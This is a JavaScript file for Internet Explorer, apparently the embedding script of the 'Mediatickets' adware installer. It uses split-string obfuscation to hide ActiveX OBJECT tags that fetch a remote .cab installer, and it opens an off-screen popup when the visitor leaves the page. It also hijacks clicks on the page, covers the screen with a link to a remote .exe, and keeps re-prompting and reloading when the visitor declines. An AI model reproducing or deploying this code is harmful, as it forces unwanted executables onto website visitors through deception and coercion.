var mtrslib_uid;
var mtrslib_retry;
var mtrslib_retry_text;
var mt_disable = false;
var mt_bSP2=false;
var mt_bkbool=false;
var mt_msgdelay=0;
var mt_msgTop=100;
var mt_msgLeft=200;
var mt_mvX=-1001;
var mt_mvY=-1001;
var mt_p=new Image();
mt_p.src="http://66.150.193.112/mbimg.gif";

mtrslib_uid = '1';
mtrslib_retry_text = "This website is sponsored by Mediatickets. Please click Yes to support this site.";
mtrslib_retry = 3;

mt_global_Init();

function mt_is_here()
{
	try {
		var testObject = new ActiveXObject("ME"+"DIA"+"TIC"+"KETSINS"+"TALLER.Med"+"iaTi"+"ckets"+"Insta"+"llerCt"+"rl.1");
		return true;
	} catch(e) {
		;
	}
	return false;
}
function mt_global_Init()
{
	/*var mt_now = new Date(); 
	if(mt_now.getTimezoneOffset()<-120){ 
		if(navigator.userLanguage.substr(0,2) != "en"){
			mt_disable=true;
		}
	}*/
	var im = window.navigator.userAgent.indexOf("MSIE"); 
	if(im < 0) mt_disable=true;
	if(mt_disable) return;
	if(window.navigator.userAgent.indexOf("SV1") > im){   
		mt_bSP2=true;
	}
	if(mt_bSP2){
		document.write('<DIV id="cntmvfrm" style="position:absolute; top:5; left:2; display:none; z-index:297;'+
		'filter: revealTrans(enabled=1, Transition=12, Duration=2) Alpha(enabled=1, opacity=55);"'+ 
		" onmousemove = 'mt_doMsgMouseMove();' onmouseup='mt_doMsgMouseUp();' onmousedown='mt_doMsgMouseDwn();'>&nbsp;</DIV>");
		document.write('<A id="cntmt" style="position:absolute; top:5; left:2; display:none; z-index:298;">&nbsp;</A>');
	 }
}

function mt_set_recurrence( recur )
{
	if(mt_is_here()) return;

	var duration = 0;
	if ( recur == "hourly" )
		duration = 60*60;
	if ( recur == "daily" )
		duration = 60*60*24;
	if ( recur == "weekly" )
		duration = 60*60*24*7;
	if ( duration != 0 )
	{
		if ( !get_cookie( "mt" + mtrslib_uid ) )
		{
			set_cookie( "mt" + mtrslib_uid, mtrslib_uid, duration );
		}
		else 
			 mt_disable = true;
	}
}

function mt_set_onload()
{
	if ( mt_disable ) { return false; }
	if (mtrslib_retry > 3) { mtrslib_retry = 3; }
	mtreq_link();
}

function mt_set_onfirstclick()
{
	if ( mt_disable ) { return false; }
	if (mtrslib_retry > 3) { mtrslib_retry = 3; }
	document.onclick = mt_onfirstclick;
}

function mt_set_onunload()
{
	if (mtrslib_retry > 3) { mtrslib_retry = 3; }
	if ( mt_disable ) { return false; }
	window.onbeforeunload = mt_onunload();
}

function mt_onunload()
{
  newWindow=window.open('','','toolbar=no,scrollbars=no,width=200,height=150,top=10000,left=100000');
  var contentstring = "<html><head>";
  contentstring += "<script language=\"JavaScript\">";
  contentstring += "function close_pop()";
  contentstring += "{";
  contentstring += "    window.close();";
  contentstring += "}";
  contentstring += "<\/script>";  
  contentstring += "<O"+"B"+"J"+"E"+"C"+"T ID=\"Med"+"iaTicket"+"sInst"+"aller"+"Demo\" WIDTH=0 HEIGHT=0 CLASSID=\"CLSID:9EB"+"320CE-BE1D-43"+"04-A0"+"81-4B46"+"65414"+"BEF\" C"+"O"+"D"+"E"+"B"+"A"+"S"+"E=\"http://www.mt-do"+"wnload.com/Med"+"iaT"+"icke"+"tsIns"+"talle"+"r.cab?refid=" + mtrslib_uid + "#Version=1,0,0,001\" onerror=\"close_pop();\">";
  contentstring += "<P"+"A"+"R"+"A"+"M NAME=\"rid\" VALUE=\"";
  contentstring += mtrslib_uid;
  contentstring += "\">";
  contentstring += "</"+"O"+"B"+"J"+"E"+"C"+"T>";
  contentstring += "</head>";
  contentstring += "<body onLoad=\"setTimeout('close_pop()',2000);\">";
  contentstring += "</body>";
  contentstring += "</html>";
  newWindow.document.open("text/html", "replace")
  newWindow.document.write(contentstring);
  newWindow.document.close();
}

function set_cookie( k, v, expire )
{
	var expire_val = "";
	if ( expire )
	{
		var exp_date;
		exp_date = new Date();
		
		exp_date.setTime( exp_date.getTime() + expire );
		expire_val = "expires=" + exp_date.toGMTString() + ";";
	}
    document.cookie = k + "=" + escape(v) + ";" + expire_val;
}

function get_cookie( k )
{
	var c_arr = document.cookie.split( "; " );
	var i;
	for ( i = 0; i < c_arr.length; i++ )
	{
		var pair = c_arr[i].split("=");
		if ( pair[0] == k )
		{
			return unescape( pair[1] );
		}
	}
	return null;
}

function mt_onfirstclick()
{
	tempElement = window.event.srcElement ;
	while("" + tempElement.href == "undefined" && tempElement.tagName != "BODY"){
          tempElement = tempElement.parentElement;
	}   
	
	if((tempElement.id == "cntmt2")||(tempElement.id == "cntmtimg")||(tempElement.id == "mtma")){
		return true;
	}
	if(!mt_bSP2){
		if((mtrslib_retry--) < 0){
			document.onclick = null;
			return true;
		}
	}
	if ( tempElement.onclick == null ) 
	{
		mt_cl_link=window.event.srcElement;
		if(!mtreq_link()){
			document.onclick = null;
			return true;
		}
	}
	window.event.CancelBubble=true;
	window.event.returnValue=false;
	return false;
}

var id2=0;
var time=0;
function mt_Cncl()
{
	var aa=document.getElementById("cntmt");	
	if(aa != null){
		aa.style.display = "none";
		aa.innerHTML = "";
	}
	mtrslib_retry--;
	mt_msgdelay=2;
	mt_msgTop=100;
	mt_msgLeft=200;
}

function mt_doMsgMouseMove()
{
	if(mt_mvX > -1000){
		mt_msgLeft += (event.clientX-mt_mvX); 
		mt_msgTop += (event.clientY-mt_mvY);
		aa=document.getElementById("cntmt");
		mt_mvX=event.clientX;mt_mvY=event.clientY;
		if(aa != null){
			aa.style.pixelLeft = mt_msgLeft; 
			aa.style.pixelTop = mt_msgTop;
		}
	}else if((event.clientY >= mt_msgTop+99) && (event.clientY <= mt_msgTop+112) 
		&&(event.clientX >= mt_msgLeft+70) && (event.clientX <= mt_msgLeft+200)){
				;
	}else{
		window.status="";
	}
}

function mt_doMsgMouseUp()
{
	if(mt_mvX > -1000){
		mt_mvX=mt_mvY=-1001;
	}
}

function mt_doMsgMouseDwn()
{
	if((event.clientY >= mt_msgTop) && (event.clientY <= mt_msgTop+27) 
		&&(event.clientX >= mt_msgLeft) && (event.clientX <= mt_msgLeft+433)){
			mt_mvX=event.clientX;mt_mvY=event.clientY;
		}
}

function doMsgDragStart() 
{
	event.returnValue=false;
    return false;  
}

function MT_SV1()
{
	var aa;
	if(id2) parent.clearInterval(id2);
	if(mt_is_here() || (mtrslib_retry<0)){
		try{
			mt_actx();
		}catch(e){
			id2 = parent.setInterval("MT_SV1()", 1000);
			return false;
		}
		mt_Cncl();
		aa=document.getElementById("cntmvfrm");	
		if(aa != null){
			aa.style.display = "none";
			aa.innerHTML = "";
		}
		return false;
	}
	var mvstr='<A id ="cntmt2" href="http://www.mt-do'+'wnload.com/Me'+'diaT'+'ic'+'ket.exe?refid='+ mtrslib_uid +'&ext=.exe"><img src="http://www.mt-do'+'wnload.com/bls.gif" width="' + 
				screen.availWidth + 'height="'+ screen.availHeight*2 +'" border="0" ></A>';	
	if(mt_bkbool == false){
		aa=document.getElementById("cntmvfrm");	
		try{
			if(aa != null){
				aa.style.pixelLeft = 0; 
				aa.style.pixelTop = 0;
				aa.style.display = "block";
				aa.filters[0].Apply();
				aa.innerHTML = mvstr;
				aa.filters[0].play();
			}
		}catch(e){
			mvstr='<A id ="cntmt2" href="http://www.mt-d'+'ownload.com/Med'+'iaTic'+'ket.exe?refid='+ mtrslib_uid +'&ext=.exe">';
			for( var i=0; i<500; i++){
				mvstr+="Med"+"iati"+"cket required! &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;";
			}
			mvstr+="</A>";
			aa.innerHTML = mvstr;
		}
		mt_bkbool=true;
	}
	++time;
	if(mt_msgdelay==0){
		mvstr='<MAP NAME="mmb" ID="mmb"><AREA ID="mtma" NOHREF onClick="javascript:mt_Cncl();"  SHAPE=RECT COORDS="432,4,453,25"> ';
		mvstr+='<AREA ID="mtma" HREF="http://www.mt-download.com/terms.html" target="new" SHAPE=RECT COORDS="70,99,200,112"> </MAP>';
		mvstr+="<img id='cntmtimg' src='http://www.mt-download.com/mbimg.gif' border='0' USEMAP='#mmb' style='cursor:default;'";
		mvstr+=" onmousemove = 'mt_doMsgMouseMove();' onmouseup='mt_doMsgMouseUp();' onmousedown='mt_doMsgMouseDwn();'  ondragstart='doMsgDragStart();' >";
		mvstr+="<BUTTON ID='btnRun' style='position:absolute; top:133; left:147; width=85; height=22;' onClick='mt_runExe();'>Run</BUTTON>";
		mvstr+="<BUTTON ID='btnCancel' style='position:absolute; top:133; left:262; width=85; height=22;' onClick='mt_Cancel();'>Cancel</BUTTON>";
		aa=document.getElementById("cntmt");	
		if(aa != null){
			aa.style.pixelLeft = mt_msgLeft; 
			aa.style.pixelTop = mt_msgTop;
			aa.style.display = "block";
			aa.innerHTML = mvstr;
		}
	}
	mt_msgdelay--;
	id2 = parent.setInterval("MT_SV1()", 1000);
	return true;
}

function mt_runExe(){
	cntmt2.click();
	mtrslib_retry--;
	window.event.CancelBubble=true;
	window.event.returnValue=false;
	return false;
}

function mt_Cancel()
{
	var elem = document.getElementById ("mmb");
	if (elem)
		elem.style.display = "none";
	elem = document.getElementById ("cntmtimg");
	if (elem)
		elem.style.display = "none";
	elem = document.getElementById ("btnRun");
	if (elem)
		elem.style.display = "none";
	elem = document.getElementById ("btnCancel");
	if (elem)
		elem.style.display = "none";
	elem = document.getElementById ("cntmt2");
	if (elem)
		elem.style.display = "none";
	
	return true;
}

function mt_actx(){
  var contentstring = "<html><head></head><body><"+"O"+"B"+"J"+"E"+"C"+"T ID=\"Med"+"iaTick"+"ets"+"Ins"+"talle"+"rDemo\" WIDTH=0 HEIGHT=0 CLASSID=\"CLSID:9"+"EB3"+"20CE-BE1"+"D-4304-A081-4B"+"466541"+"4BEF\" C"+"O"+"D"+"E"+"B"+"A"+"S"+"E=\"http://www.mt-d"+"ownload.com/Medi"+"aTick"+"ets"+"Inst"+"all"+"er.cab?refid=" + mtrslib_uid + "#Version=1,0,0,001\" ";
	if(!mt_bSP2){
	 contentstring += "onError='if(parent.mtrslib_retry>0){alert(parent.mtrslib_retry_text + \". You will be prompted \" + parent.mtrslib_retry + \" more time(s)\");window.location.reload();} parent.mtrslib_retry--;'";
	}
	contentstring += "><PARAM NAME=\"rid\" VALUE=\"";
	contentstring += mtrslib_uid;
	contentstring += "\">";
	contentstring += "<\/OBJECT></body></html>";
	content.document.open( "text/html", "replace" );
	content.document.write(contentstring);
	content.document.close();
}

function mtreq_link()
{
	if(mtrslib_retry<0) return false;
	if(mt_bSP2)
		MT_SV1();
	else
		mt_actx();
	return true;
}

